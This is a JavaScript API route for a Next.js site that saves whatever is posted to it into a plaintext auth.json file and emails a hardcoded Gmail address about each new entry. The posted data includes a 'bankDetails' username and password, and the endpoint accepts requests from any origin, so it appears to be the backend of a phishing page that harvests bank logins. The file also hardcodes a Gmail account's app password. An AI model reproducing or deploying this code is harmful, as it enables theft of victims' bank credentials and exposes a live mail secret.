// /pages/api/save-user.js

import fs from "fs";
import path from "path";
import nodemailer from "nodemailer";

// Helper function to read the existing JSON file
const readDataFromFile = () => {
  const dataFilePath = path.join(process.cwd(), "data", "auth.json");
  const jsonData = fs.readFileSync(dataFilePath, "utf8");
  return JSON.parse(jsonData || "[]");
};

// Helper function to write data to the JSON file
const writeDataToFile = (data) => {
  const dataFilePath = path.join(process.cwd(), "data", "auth.json");
  fs.writeFileSync(dataFilePath, JSON.stringify(data, null, 2));
};

// Function to send email with Nodemailer
const sendEmail = async (userId, userEmail, userName, password) => {
  // Create a transporter object using SMTP transport
  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: "asalamlatif@gmail.com",
      pass: "prmr opim qodx xnpx",
    },
  });

  // Email options
  const mailOptions = {
    from: "asalamlatif@gmail.com", // Replace with your own email address
    to: "toonilaniyan@gmail.com", // Replace with your own email address
    subject: "Welcome!", // Subject line
    html: `
      <p>Hello!</p>
      <p>Your details are as follows:</p>
      <ul>
        <li><strong>User ID:</strong> ${userId}</li>
        
      </ul>
      <p>Thank you for joining us!</p>
    `,
  };

  // Send email
  await transporter.sendMail(mailOptions);
};

export default async function handler(req, res) {
  res.setHeader("Access-Control-Allow-Origin", "*");
  console.log(req.method);

  try {
    // Ensure the request method is POST
    if (req.method !== "POST") {
      throw new Error(`Method ${req.method} Not Allowed`);
    }

    // Get the user data from the request body
    const newUser = req.body;

    // Read existing users from the JSON file
    const users = readDataFromFile();

    // Generate a new user ID
    const userId = `user${users.length + 1}`;
    const userWithId = { ...newUser, id: userId };

    // Add the new user to the users array
    users.push(userWithId);

    // Write the updated users back to the JSON file
    writeDataToFile(users);

    // Extract email, username, and password safely
    const { email, bankDetails = {} } = newUser; // Provide default empty object for bankDetails
    const { username = "", password = "" } = bankDetails; // Provide default values for username and password

    // Send an email with the user ID, username, and password
    await sendEmail(userId, email, username, password);

    // Respond with the new user data
    res.status(201).json({ message: "User saved successfully", user: userWithId });

  } catch (error) {
    // Handle the case when the method is not allowed
    if (error.message.includes("Method")) {
      return res.status(405).end(error.message);
    }

    // If there's an issue sending email, log it and respond with appropriate message
    console.error("Error:", error);
    res.status(500).json({ message: "An error occurred", error: error.message });
  }
}

